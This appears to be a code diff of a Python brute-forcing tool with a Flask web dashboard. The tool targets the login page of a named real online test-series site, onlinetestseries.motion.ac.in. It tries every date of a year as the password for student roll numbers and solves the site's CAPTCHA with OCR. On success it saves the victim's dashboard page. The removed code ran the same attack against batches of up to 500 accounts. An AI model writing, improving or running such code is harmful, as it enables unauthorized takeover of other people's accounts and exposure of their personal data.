@@ -1,41 +1,70 @@
 #!/usr/bin/env python3
 """
-Motion OTS Batch Brute‑Forcer – Reliable Edition (Fixed CAPTCHA throttling)
-- Sequential dates per user, 3 attempts per password
-- All attempts logged live
-- Global CAPTCHA semaphore + jitter + backoff prevents server disconnect
-- Reduced concurrent users to 10 for reliability
+Motion OTS Brute‑Force Dashboard – One‑by‑One with Delays
+Author: Potato
+
+This script brute‑forces the login on onlinetestseries.motion.ac.in
+by trying every date in a given year as the password (DD-MM-YYYY).
+It processes passwords sequentially with a configurable delay to avoid
+rate limiting and to be gentle on the server.
+
+Features:
+- Flask web dashboard with live logs
+- SQLite database for job persistence
+- ddddocr CAPTCHA solver with fallback (Tesseract optional)
+- Configurable delay between attempts (default 2 seconds)
+- Progress tracking with live updates
+- Retry logic (up to 3 attempts per password with fresh CAPTCHAs)
+- Stop job functionality
+- Test endpoint for manual password verification
+
+Deployment: Ready for Render with Docker.
 """
 
-import os, sys, time, uuid, json, threading, queue, asyncio, aiohttp, random
+import os
+import sys
+import time
+import uuid
+import json
+import threading
+import queue
+import asyncio
+import aiohttp
 from bs4 import BeautifulSoup
 import re
 from datetime import datetime, timedelta
-import sqlite3, traceback
+import sqlite3
+import traceback
 from flask import Flask, render_template_string, request, jsonify, g
 
 # ----------------------------------------------------------------------
 # CONFIGURATION
 # ----------------------------------------------------------------------
-DELAY_BETWEEN_ATTEMPTS = 0.3         # seconds between passwords (safe)
-MAX_RETRIES_PER_PASSWORD = 3         # 3 tries per date
-MAX_CONCURRENT_USERS = 10            # lower to avoid flooding captcha server
-CAPTCHA_FETCH_TIMEOUT = 12           # increased timeout
-LOGIN_TIMEOUT = 12
-CAPTCHA_PREPROCESS = True
-MAX_CAPTCHA_CONCURRENT = 3           # global cap on simultaneous captcha fetches
+DELAY_BETWEEN_ATTEMPTS = 2.0          # seconds (adjust to be slower/faster)
+MAX_RETRIES_PER_PASSWORD = 3          # number of times to retry with fresh CAPTCHA
+CONCURRENT_WORKERS = 1                # keep at 1 for strict one‑by‑one
+CAPTCHA_FETCH_TIMEOUT = 8             # seconds
+LOGIN_TIMEOUT = 12                    # seconds
+POLLING_INTERVAL = 1.5                # seconds for frontend updates
 
 # ----------------------------------------------------------------------
-# OCR SETUP
+# OCR SETUP (ddddocr)
 # ----------------------------------------------------------------------
 try:
     import ddddocr
     ocr = ddddocr.DdddOcr(ocr=True, det=False)
-    print("✅ ddddocr initialized")
+    OCR_OK = True
+    print("✅ ddddocr initialized successfully")
 except ImportError:
-    print("❌ Install ddddocr: pip install ddddocr")
+    OCR_OK = False
+    print("❌ ddddocr not installed. Run: pip install ddddocr")
+    sys.exit(1)
+except Exception as e:
+    OCR_OK = False
+    print(f"❌ ddddocr initialization failed: {e}")
     sys.exit(1)
 
+# Optional Tesseract fallback (if installed)
 try:
     import pytesseract
     pytesseract.pytesseract.tesseract_cmd = '/usr/bin/tesseract'
@@ -43,36 +72,29 @@ try:
 except:
     TESSERACT_OK = False
 
-def preprocess_captcha(img_bytes):
-    if not CAPTCHA_PREPROCESS:
-        return img_bytes
-    try:
-        from PIL import Image, ImageEnhance
-        from io import BytesIO
-        img = Image.open(BytesIO(img_bytes)).convert('L')
-        enhancer = ImageEnhance.Contrast(img)
-        img = enhancer.enhance(2.5)
-        buf = BytesIO()
-        img.save(buf, format='PNG')
-        return buf.getvalue()
-    except:
-        return img_bytes
-
 def solve_captcha_image(img_bytes, log_queue=None):
+    """
+    Solve CAPTCHA using ddddocr.
+    Returns the solved text (first 6 chars) or None on failure.
+    """
     try:
-        processed = preprocess_captcha(img_bytes)
-        result = ocr.classification(processed)
+        result = ocr.classification(img_bytes)
         if result:
+            # Keep only uppercase letters and digits
             cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
             if len(cleaned) >= 4:
                 return cleaned[:6]
+            if len(result) >= 4:
+                return result[:6]
+        # If ddddocr fails, try Tesseract fallback
         if TESSERACT_OK:
             from PIL import Image
             from io import BytesIO
-            img = Image.open(BytesIO(processed))
+            img = Image.open(BytesIO(img_bytes))
+            img = img.convert('L')
             img = img.point(lambda p: 0 if p < 140 else 255, '1')
-            config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-            text = pytesseract.image_to_string(img, config=config)
+            custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+            text = pytesseract.image_to_string(img, config=custom_config)
             cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
             if len(cleaned) >= 4:
                 return cleaned[:6]
@@ -83,7 +105,7 @@ def solve_captcha_image(img_bytes, log_queue=None):
         return None
 
 # ----------------------------------------------------------------------
-# DATABASE
+# DATABASE SETUP
 # ----------------------------------------------------------------------
 DATABASE = 'brute_jobs.db'
 
@@ -99,10 +121,10 @@ def init_db():
         conn.execute('''
             CREATE TABLE IF NOT EXISTS jobs (
                 job_id TEXT PRIMARY KEY,
-                user_ids TEXT NOT NULL,
+                user_id TEXT NOT NULL,
                 year INTEGER NOT NULL,
                 status TEXT DEFAULT 'idle',
-                results TEXT DEFAULT '{}',
+                password TEXT,
                 logs TEXT DEFAULT '[]',
                 start_time TEXT,
                 end_time TEXT,
@@ -115,44 +137,52 @@ def init_db():
 # JOB CLASS
 # ----------------------------------------------------------------------
 class BruteJob:
-    def __init__(self, job_id, user_ids, year, status='idle', results=None, logs=None):
+    """
+    A brute‑force job that runs in a background thread.
+    It processes one password at a time with delays.
+    """
+
+    def __init__(self, job_id, user_id, year, status='idle', password=None, logs=None):
         self.job_id = job_id
-        self.user_ids = user_ids
+        self.user_id = user_id
         self.year = year
-        self.status = status
-        self.results = results if results is not None else {}
+        self.status = status          # idle, running, success, failed, stopped
+        self.password = password
         self.logs = logs if logs is not None else []
         self.start_time = None
         self.end_time = None
         self.thread = None
         self.stop_flag = False
         self.log_queue = queue.Queue()
-        self.user_progress = {}
-        self.captcha_sem = asyncio.Semaphore(MAX_CAPTCHA_CONCURRENT)
+        self.total_passwords = 0
+        self.processed = 0
 
     @classmethod
     def from_db_row(cls, row):
-        return cls(
+        job = cls(
             row['job_id'],
-            json.loads(row['user_ids']),
+            row['user_id'],
             row['year'],
             row['status'],
-            json.loads(row['results']) if row['results'] else {},
+            row['password'],
             json.loads(row['logs']) if row['logs'] else []
         )
+        job.start_time = row.get('start_time')
+        job.end_time = row.get('end_time')
+        return job
 
     def save_to_db(self):
         with sqlite3.connect(DATABASE) as conn:
             conn.execute('''
                 INSERT OR REPLACE INTO jobs
-                (job_id, user_ids, year, status, results, logs, start_time, end_time)
+                (job_id, user_id, year, status, password, logs, start_time, end_time)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)
             ''', (
                 self.job_id,
-                json.dumps(self.user_ids),
+                self.user_id,
                 self.year,
                 self.status,
-                json.dumps(self.results),
+                self.password,
                 json.dumps(self.logs),
                 self.start_time,
                 self.end_time
@@ -165,149 +195,174 @@ class BruteJob:
         self.status = 'running'
         self.start_time = datetime.now().isoformat()
         self.logs = []
-        self.results = {}
         self.stop_flag = False
-        self.user_progress = {}
+        self.password = None
         self.save_to_db()
-        self.thread = threading.Thread(target=self._run, daemon=True)
+        self.thread = threading.Thread(target=self._run)
+        self.thread.daemon = True
         self.thread.start()
 
     def _run(self):
         try:
-            asyncio.run(self._async_batch())
+            asyncio.run(self._async_bruteforce())
         except Exception as e:
-            self.log_queue.put(f"❌ Fatal error: {traceback.format_exc()}")
+            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
         finally:
-            if self.status not in ('success', 'failed', 'stopped'):
-                if any(self.results.get(uid) for uid in self.user_ids):
-                    self.status = 'success'
-                else:
-                    self.status = 'failed'
+            self.status = 'success' if self.password else 'failed'
             self.end_time = datetime.now().isoformat()
             self.save_to_db()
 
-    async def _async_batch(self):
+    async def _async_bruteforce(self):
+        """
+        Main async loop: generate all dates in the year and process one by one.
+        """
         log_queue = self.log_queue
+        user_id = self.user_id
         year = self.year
-        log_queue.put_nowait(
-            f"🚀 Batch started: {len(self.user_ids)} users, {year}, "
-            f"sequential mode, delay={DELAY_BETWEEN_ATTEMPTS}s, retries={MAX_RETRIES_PER_PASSWORD}"
-        )
 
-        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_USERS + 5)
+        start_date = datetime(year, 1, 1)
+        end_date = datetime(year, 12, 31)
+        dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
+        self.total_passwords = len(dates)
+        self.processed = 0
+        log_queue.put_nowait(f"🚀 Starting brute‑force for {user_id} over {year} ({self.total_passwords} passwords)")
+        log_queue.put_nowait(f"⏱️  Delay between attempts: {DELAY_BETWEEN_ATTEMPTS}s, retries: {MAX_RETRIES_PER_PASSWORD}")
+
+        connector = aiohttp.TCPConnector(limit=CONCURRENT_WORKERS, limit_per_host=CONCURRENT_WORKERS)
         timeout = aiohttp.ClientTimeout(total=20, connect=10)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            semaphore = asyncio.Semaphore(MAX_CONCURRENT_USERS)
-            tasks = [self._bruteforce_one_user(session, uid, year, semaphore) for uid in self.user_ids]
-            await asyncio.gather(*tasks, return_exceptions=True)
+            semaphore = asyncio.Semaphore(CONCURRENT_WORKERS)
+            result_queue = asyncio.Queue()
+            stop_event = asyncio.Event()
 
-        found = sum(1 for v in self.results.values() if v)
-        log_queue.put_nowait(f"🏁 Batch finished. Passwords found: {found}/{len(self.user_ids)}")
-
-    async def _bruteforce_one_user(self, session, user_id, year, semaphore):
-        async with semaphore:
-            if self.stop_flag:
-                return
-            log_queue = self.log_queue
-            log_queue.put_nowait(f"👤 [{user_id}] Starting sequential brute‑force for {year}")
-
-            start_date = datetime(year, 1, 1)
-            end_date = datetime(year, 12, 31)
-            dates = [start_date + timedelta(days=i) for i in range((end_date - start_date).days + 1)]
-            total = len(dates)
-            self.user_progress[user_id] = {'processed': 0, 'total': total}
-
-            for i, date in enumerate(dates):
-                if self.stop_flag:
-                    break
+            tasks = []
+            for date in dates:
                 password = date.strftime("%d-%m-%Y")
-                self.user_progress[user_id]['processed'] = i + 1
+                tasks.append(asyncio.create_task(
+                    self._worker(session, user_id, password, semaphore, result_queue, stop_event, log_queue)
+                ))
 
-                success = False
-                for attempt in range(MAX_RETRIES_PER_PASSWORD):
-                    if self.stop_flag:
+            found = None
+            session_obj = None
+            # Wait for the first success or all tasks to finish
+            while True:
+                try:
+                    found, session_obj = await asyncio.wait_for(result_queue.get(), timeout=1.0)
+                    break
+                except asyncio.TimeoutError:
+                    if all(t.done() for t in tasks):
                         break
+                if stop_event.is_set():
+                    break
 
-                    captcha = await self._fetch_captcha_throttled(session, log_queue)
-                    if not captcha:
-                        log_queue.put_nowait(f"⏭️  [{user_id}] No CAPTCHA for {password} (attempt {attempt+1})")
-                        continue
+            # Cancel remaining tasks
+            for t in tasks:
+                t.cancel()
 
-                    attempt_str = f"attempt {attempt+1}/{MAX_RETRIES_PER_PASSWORD}" if MAX_RETRIES_PER_PASSWORD > 1 else ""
-                    log_queue.put_nowait(f"🔑 [{user_id}] {password} | CAPTCHA {captcha} {attempt_str}")
-
+            if found:
+                self.password = found
+                log_queue.put_nowait(f"🎉 Password found: {found}")
+                if session_obj:
                     try:
-                        success, reason = await self._try_login(session, user_id, password, captcha, log_queue)
-                        if success:
-                            log_queue.put_nowait(f"✅ [{user_id}] SUCCESS! Password = {password}")
-                            self.results[user_id] = password
-                            try:
-                                dash = await session.get(
-                                    "https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php"
-                                )
-                                if dash.status == 200:
-                                    with open(f"dashboard_{user_id}.html", "w") as f:
-                                        f.write(await dash.text())
-                            except:
-                                pass
-                            self.save_to_db()
-                            return
-
-                        log_queue.put_nowait(f"❌ [{user_id}] {password} failed: {reason[:80]}")
-                    except asyncio.TimeoutError:
-                        log_queue.put_nowait(f"⏰ [{user_id}] Timeout on {password}")
+                        dash = await session_obj.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
+                        if dash.status == 200:
+                            with open(f"dashboard_{user_id}.html", "w") as f:
+                                f.write(await dash.text())
+                            log_queue.put_nowait("💾 Dashboard HTML saved.")
                     except Exception as e:
-                        log_queue.put_nowait(f"❌ [{user_id}] Exception: {str(e)}")
+                        log_queue.put_nowait(f"⚠️ Dashboard save error: {e}")
+            else:
+                log_queue.put_nowait("❌ No password found in that year.")
 
-                    if not self.stop_flag and attempt < MAX_RETRIES_PER_PASSWORD - 1:
-                        await asyncio.sleep(0.1)
+    async def _worker(self, session, user_id, password, semaphore, result_queue, stop_event, log_queue):
+        """
+        Worker for a single password. It tries up to MAX_RETRIES_PER_PASSWORD times
+        and then moves on to the next password.
+        """
+        if stop_event.is_set():
+            return
+        async with semaphore:
+            # Update progress
+            self.processed += 1
+            progress_msg = f"Progress: {self.processed}/{self.total_passwords} ({self.processed/self.total_passwords*100:.1f}%)"
+            log_queue.put_nowait(f"⏳ Attempting {password}  [{progress_msg}]")
 
-                if MAX_RETRIES_PER_PASSWORD > 1 and not success:
-                    log_queue.put_nowait(f"⏭️  [{user_id}] Gave up on {password} after {MAX_RETRIES_PER_PASSWORD} attempts")
+            for attempt in range(MAX_RETRIES_PER_PASSWORD):
+                if stop_event.is_set():
+                    return
+                try:
+                    # Step 1: Fetch and solve CAPTCHA
+                    captcha = await self._fetch_captcha(session, log_queue)
+                    if not captcha:
+                        log_queue.put_nowait(f"⏭️  No CAPTCHA for {password} (attempt {attempt+1})")
+                        continue
+                    log_queue.put_nowait(f"🔑 Trying {password} with CAPTCHA {captcha}")
 
-                if (i + 1) % 10 == 0:
-                    log_queue.put_nowait(
-                        f"📊 [{user_id}] Progress: {i+1}/{total} ({(i+1)/total*100:.1f}%)"
-                    )
+                    # Step 2: Perform login
+                    success, response = await self._try_login(session, user_id, password, captcha, log_queue)
+                    if success:
+                        log_queue.put_nowait(f"✅ SUCCESS! Password = {password}")
+                        result_queue.put_nowait((password, session))
+                        stop_event.set()
+                        return
 
-                if not self.stop_flag:
-                    await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
+                    # Step 3: Check if we should retry
+                    if response in ("captcha_error", "redirect_failure", "timeout"):
+                        log_queue.put_nowait(f"🔄 Retry‑able ({response}) – attempt {attempt+1}/{MAX_RETRIES_PER_PASSWORD}")
+                        await asyncio.sleep(1.0)   # small delay before retry
+                        continue
+                    else:
+                        # Non‑retryable error – log it and give up
+                        log_queue.put_nowait(f"❌ Login failed: {response[:120]}")
+                        break  # break out of retry loop
 
-            self.results[user_id] = None
-            log_queue.put_nowait(f"❌ [{user_id}] No password found in {year}.")
-            self.save_to_db()
+                except asyncio.TimeoutError:
+                    log_queue.put_nowait(f"⏰ Timeout for {password}, retrying...")
+                    await asyncio.sleep(1.0)
+                    continue
+                except Exception as e:
+                    log_queue.put_nowait(f"❌ Worker error: {str(e)}")
+                    break
 
-    async def _fetch_captcha_throttled(self, session, log_queue):
-        async with self.captcha_sem:
-            return await self._fetch_captcha(session, log_queue)
+            # If we exhausted retries without success
+            log_queue.put_nowait(f"⏭️  Giving up on {password} after {MAX_RETRIES_PER_PASSWORD} attempts")
+
+            # Apply delay before next password (except if stopped)
+            if not stop_event.is_set():
+                log_queue.put_nowait(f"⏱️  Waiting {DELAY_BETWEEN_ATTEMPTS}s before next attempt...")
+                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
 
     async def _fetch_captcha(self, session, log_queue):
-        # Exponential backoff with jitter
+        """
+        Fetch a CAPTCHA image and solve it.
+        Returns the text or None.
+        """
         for attempt in range(3):
             try:
-                # Random jitter to avoid synchronised bursts
-                await asyncio.sleep(random.uniform(0.1, 0.6))
                 rand = int(time.time() * 1000) + attempt + os.getpid()
                 url = f"https://onlinetestseries.motion.ac.in/captcha.php?rand={rand}"
                 async with session.get(url, timeout=aiohttp.ClientTimeout(total=CAPTCHA_FETCH_TIMEOUT)) as resp:
                     if resp.status == 200:
                         img_bytes = await resp.read()
                         if len(img_bytes) < 100:
+                            await asyncio.sleep(0.2)
                             continue
                         loop = asyncio.get_running_loop()
                         captcha = await loop.run_in_executor(None, solve_captcha_image, img_bytes, log_queue)
                         if captcha:
                             return captcha
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(0.3)
             except asyncio.TimeoutError:
-                await asyncio.sleep(1.5)
+                log_queue.put_nowait("⏰ CAPTCHA fetch timeout")
             except Exception as e:
-                if log_queue:
-                    log_queue.put_nowait(f"⚠️ CAPTCHA fetch error: {e}")
-                await asyncio.sleep(1.0 + attempt * 0.5)
+                log_queue.put_nowait(f"⚠️ CAPTCHA error: {e}")
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
+        """
+        Attempt login with the given credentials and CAPTCHA.
+        Returns (success, message).
+        """
         data = {
             "login_username": user_id,
             "login_password": password,
@@ -317,6 +372,7 @@ class BruteJob:
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
+            "Accept-Language": "en-US,en;q=0.9",
             "Referer": "https://onlinetestseries.motion.ac.in/",
         }
         try:
@@ -329,31 +385,26 @@ class BruteJob:
             ) as resp:
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
-                    log_queue.put_nowait(f"🔍 [{user_id}] Redirect → {location[:120]}")
-                    if any(x in location for x in ["login.php", "captcha", "index.php"]):
-                        return False, "redirect_failure"
-                    try:
-                        async with session.get(location, allow_redirects=True,
-                                                timeout=aiohttp.ClientTimeout(total=5)) as dash_resp:
-                            text = await dash_resp.text()
-                            if "dashboard" in text.lower() or "logout" in text.lower():
-                                return True, None
-                            return True, None
-                    except:
+                    if "dashboard/student-dashboard.php" in location:
                         return True, None
+                    else:
+                        # Redirect to index.php – likely CAPTCHA error or wrong credentials
+                        return False, "redirect_failure"
                 elif resp.status == 200:
                     text = await resp.text()
                     soup = BeautifulSoup(text, "html.parser")
                     err = soup.find("div", class_="alertmsg")
                     if err:
                         err_text = err.text.strip()
-                        if "captcha" in err_text.lower():
+                        if "CAPTCHA" in err_text or "captcha" in err_text:
                             return False, "captcha_error"
                         else:
                             return False, err_text[:100]
-                    if "dashboard" in text.lower() or "logout" in text.lower():
-                        return True, None
-                    return False, "unknown_failure"
+                    else:
+                        # No error div; check for dashboard indicators
+                        if "dashboard" in text.lower() or "logout" in text.lower():
+                            return True, None
+                        return False, "unknown_failure"
                 else:
                     return False, f"HTTP {resp.status}"
         except asyncio.TimeoutError:
@@ -367,13 +418,23 @@ class BruteJob:
         self.save_to_db()
 
     def get_updates(self):
+        """
+        Retrieve new log messages from the queue.
+        Returns a list of new messages and updates the job's logs.
+        """
         new_logs = []
         while not self.log_queue.empty():
             try:
                 msg = self.log_queue.get_nowait()
                 self.logs.append(msg)
                 new_logs.append(msg)
-                if len(self.logs) % 10 == 0:
+                # If success message is detected, update status and password
+                if "SUCCESS" in msg or "Password found" in msg:
+                    if "Password =" in msg:
+                        self.password = msg.split("Password =")[-1].strip()
+                    self.status = 'success'
+                # Save to DB periodically
+                if len(self.logs) % 5 == 0:
                     self.save_to_db()
             except:
                 break
@@ -383,10 +444,10 @@ class BruteJob:
 
 
 # ----------------------------------------------------------------------
-# FLASK APP (unchanged UI)
+# FLASK WEB APPLICATION
 # ----------------------------------------------------------------------
 app = Flask(__name__)
-app.secret_key = 'change-this-in-production'
+app.secret_key = 'supersecretkey-change-this-in-production'
 jobs = {}
 
 def load_jobs_from_db():
@@ -401,25 +462,29 @@ def load_jobs_from_db():
 
 @app.route('/')
 def index():
+    """
+    Main dashboard page.
+    """
     HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Motion Batch Brute‑Force</title>
+    <title>Motion Brute‑Force Dashboard</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
-        .container { max-width: 1100px; margin: auto; }
+        .container { max-width: 1000px; margin: auto; }
         .card { background: #161b22; padding: 20px; border-radius: 12px; margin-bottom: 20px; }
         h1 { color: #58a6ff; }
-        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: flex-start; }
+        .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
         .form-group label { font-weight: bold; min-width: 80px; }
-        .form-group textarea, .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
-        .form-group textarea { resize: vertical; min-height: 120px; }
+        .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 150px; }
         .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .btn-start { background: #238636; color: #fff; }
+        .btn-start:hover { background: #2ea043; }
         .btn-stop { background: #da3633; color: #fff; }
+        .btn-stop:hover { background: #f85149; }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .logs-box { background: #0d1117; padding: 15px; border-radius: 8px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 13px; white-space: pre-wrap; margin-top: 10px; }
         .log-entry { border-bottom: 1px solid #21262d; padding: 3px 0; }
@@ -434,27 +499,28 @@ def index():
         .job-status.success { color: #3fb950; }
         .job-status.failed { color: #f85149; }
         .job-status.stopped { color: #d29922; }
+        .job-status.idle { color: #8b949e; }
+        .job-actions a { color: #58a6ff; margin-left: 10px; cursor: pointer; }
         .help-text { color: #8b949e; font-size: 0.9em; margin-top: 5px; }
-        .user-results span { margin-right: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="card">
-        <h1>⚡ Motion OTS Batch Brute‑Forcer (Reliable Edition)</h1>
-        <p>Paste roll numbers (one per line, commas, or ranges) and a year. 3 attempts per password, live logs for every try.</p>
-        <p class="help-text">🚀 Sequential per user (no parallel dates) → no server disconnects. Global captcha throttle + jitter + backoff.</p>
+        <h1>🚀 Motion OTS Brute‑Forcer</h1>
+        <p>Enter a user ID (roll number) and a year to test all dates as passwords.</p>
+        <p class="help-text">⏱️  One password at a time with a delay between attempts to avoid rate‑limiting.</p>
         <form id="bruteForm">
             <div class="form-group">
-                <label for="user_ids">User IDs</label>
-                <textarea id="user_ids" placeholder="26173000177&#10;26173000179&#10;..."></textarea>
+                <label for="user_id">User ID</label>
+                <input type="text" id="user_id" placeholder="e.g. 26173000005" required>
             </div>
             <div class="form-group">
                 <label for="year">Year</label>
-                <input type="number" id="year" placeholder="e.g. 2010" min="1900" max="2100" required>
+                <input type="number" id="year" placeholder="e.g. 2009" min="1900" max="2100" required>
             </div>
             <div style="display: flex; gap: 15px; flex-wrap: wrap;">
-                <button type="submit" class="btn btn-start" id="startBtn">▶ Start</button>
+                <button type="submit" class="btn btn-start" id="startBtn">▶ Start Brute‑Force</button>
                 <button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
             </div>
         </form>
@@ -465,16 +531,11 @@ def index():
         <div id="logs" class="logs-box">Waiting for logs...</div>
     </div>
     <div class="card">
-        <h2>📋 Job History</h2>
+        <h2>📋 Previous Jobs</h2>
         <div id="jobList" class="job-list"></div>
     </div>
 </div>
 <script>
-    document.getElementById('bruteForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        startJob();
-    });
-
     let jobId = null;
     let pollInterval = null;
     const logsDiv = document.getElementById('logs');
@@ -484,53 +545,19 @@ def index():
     const stopBtn = document.getElementById('stopBtn');
     const jobListDiv = document.getElementById('jobList');
 
-    function parseUserIds(raw) {
-        const ids = new Set();
-        const parts = raw.split(/[\\n,; ]+/);
-        for (let part of parts) {
-            part = part.trim();
-            if (part === '') continue;
-            if (part.includes('-')) {
-                const [start, end] = part.split('-').map(s => s.trim());
-                const startNum = parseInt(start, 10);
-                const endNum = parseInt(end, 10);
-                if (!isNaN(startNum) && !isNaN(endNum) && startNum <= endNum) {
-                    for (let i = startNum; i <= endNum; i++) ids.add(i.toString());
-                }
-            } else {
-                ids.add(part);
-            }
-        }
-        return Array.from(ids);
-    }
-
-    async function startJob() {
-        const rawIds = document.getElementById('user_ids').value.trim();
+    document.getElementById('bruteForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const user_id = document.getElementById('user_id').value.trim();
         const year = document.getElementById('year').value.trim();
-        if (!rawIds || !year) {
-            alert('Please fill all fields.');
-            return;
-        }
-        const user_ids = parseUserIds(rawIds);
-        if (user_ids.length === 0) {
-            alert('No valid user IDs found.');
-            return;
-        }
-        if (user_ids.length > 500) {
-            alert('Maximum 500 IDs allowed.');
-            return;
-        }
-
+        if (!user_id || !year) return alert('Please fill all fields.');
         startBtn.disabled = true;
         stopBtn.disabled = false;
         logsDiv.innerHTML = '';
         statusText.innerText = 'Starting...';
         passwordResult.innerText = '';
-
         const formData = new FormData();
-        formData.append('user_ids', JSON.stringify(user_ids));
+        formData.append('user_id', user_id);
         formData.append('year', year);
-
         try {
             const resp = await fetch('/start', { method: 'POST', body: formData });
             const data = await resp.json();
@@ -548,16 +575,16 @@ def index():
             alert('Error starting job: ' + err.message);
             resetUI();
         }
-    }
+    });
 
     stopBtn.addEventListener('click', async () => {
         if (!jobId) return;
         try {
             await fetch(`/stop/${jobId}`, { method: 'POST' });
-            statusText.innerText = 'Stopped';
+            statusText.innerText = 'Stopped by user';
             stopBtn.disabled = true;
             startBtn.disabled = false;
-            clearInterval(pollInterval);
+            if (pollInterval) clearInterval(pollInterval);
             loadJobs();
         } catch (err) {
             alert('Stop error: ' + err.message);
@@ -570,6 +597,7 @@ def index():
             const resp = await fetch(`/status/${jobId}`);
             const data = await resp.json();
             if (data.error) {
+                console.error(data.error);
                 clearInterval(pollInterval);
                 resetUI();
                 return;
@@ -578,34 +606,39 @@ def index():
                 data.new_logs.forEach(msg => {
                     const div = document.createElement('div');
                     div.className = 'log-entry';
-                    if (msg.includes('SUCCESS')) div.classList.add('success');
-                    else if (msg.includes('❌')) div.classList.add('error');
-                    else div.classList.add('info');
+                    if (msg.includes('SUCCESS') || msg.includes('Password found')) {
+                        div.classList.add('success');
+                    } else if (msg.includes('❌') || msg.includes('Error')) {
+                        div.classList.add('error');
+                    } else {
+                        div.classList.add('info');
+                    }
                     div.textContent = msg;
                     logsDiv.appendChild(div);
+                    logsDiv.scrollTop = logsDiv.scrollHeight;
                 });
-                logsDiv.scrollTop = logsDiv.scrollHeight;
             }
             if (data.status === 'success') {
-                statusText.innerText = '✅ Completed';
-                stopBtn.disabled = true; startBtn.disabled = false;
-                clearInterval(pollInterval); loadJobs();
+                statusText.innerText = '✅ Success!';
+                passwordResult.innerText = `🎉 Password: ${data.password}`;
+                stopBtn.disabled = true;
+                startBtn.disabled = false;
+                clearInterval(pollInterval);
+                loadJobs();
             } else if (data.status === 'failed') {
-                statusText.innerText = '❌ No password found';
-                stopBtn.disabled = true; startBtn.disabled = false;
-                clearInterval(pollInterval); loadJobs();
+                statusText.innerText = '❌ Failed – no password found.';
+                stopBtn.disabled = true;
+                startBtn.disabled = false;
+                clearInterval(pollInterval);
+                loadJobs();
             } else if (data.status === 'stopped') {
-                statusText.innerText = '⏹ Stopped';
-                stopBtn.disabled = true; startBtn.disabled = false;
-                clearInterval(pollInterval); loadJobs();
-            }
-            if (data.results) {
-                let res = 'Results: ';
-                for (const uid in data.results) {
-                    const pwd = data.results[uid];
-                    res += `<span class="${pwd ? 'success' : 'error'}">${uid}: ${pwd || '❌'}</span> `;
-                }
-                passwordResult.innerHTML = res;
+                statusText.innerText = '⏹ Stopped.';
+                stopBtn.disabled = true;
+                startBtn.disabled = false;
+                clearInterval(pollInterval);
+                loadJobs();
+            } else if (data.status === 'running') {
+                statusText.innerText = '🔄 Running...';
             }
         } catch (err) {
             console.error('Poll error:', err);
@@ -620,23 +653,19 @@ def index():
                 jobListDiv.innerHTML = data.jobs.map(j => `
                     <div class="job-item">
                         <div>
-                            <strong>${j.user_ids_count} users</strong> (${j.year})
+                            <strong>${j.user_id}</strong> (${j.year})
                             <span class="job-status ${j.status}">${j.status.toUpperCase()}</span>
-                            <div class="user-results">
-                                ${Object.entries(j.results || {}).map(([uid, pwd]) =>
-                                    `<span class="${pwd ? 'success' : 'error'}">${uid}: ${pwd || '❌'}</span>`
-                                ).join('')}
-                            </div>
-                            <small style="color:#8b949e;">${j.created_at}</small>
+                            ${j.password ? `🔑 ${j.password}` : ''}
+                            <span style="font-size:0.8em;color:#8b949e;">${j.created_at}</span>
                         </div>
                         <div>
-                            <a onclick="viewJob('${j.job_id}')">Logs</a>
+                            <a onclick="viewJob('${j.job_id}')">View Logs</a>
                             ${j.status === 'running' ? `<a onclick="stopJob('${j.job_id}')">Stop</a>` : ''}
                         </div>
                     </div>
                 `).join('');
             }
-        } catch (err) { console.error(err); }
+        } catch(err) { console.error(err); }
     }
 
     async function viewJob(jid) {
@@ -645,14 +674,16 @@ def index():
         if (data.logs) {
             logsDiv.innerHTML = data.logs.map(msg => `<div class="log-entry">${msg}</div>`).join('');
             statusText.innerText = `Job ${jid} (${data.status})`;
-            passwordResult.innerHTML = data.results ? Object.entries(data.results).map(([u,p])=>`<span class="${p?'success':'error'}">${u}: ${p||'❌'}</span>`).join(' ') : '';
+            passwordResult.innerText = data.password ? `Password: ${data.password}` : '';
         }
     }
 
     async function stopJob(jid) {
         if (!confirm('Stop this job?')) return;
-        await fetch(`/stop/${jid}`, { method: 'POST' });
-        loadJobs();
+        try {
+            await fetch(`/stop/${jid}`, { method: 'POST' });
+            loadJobs();
+        } catch(err) { alert(err.message); }
     }
 
     function resetUI() {
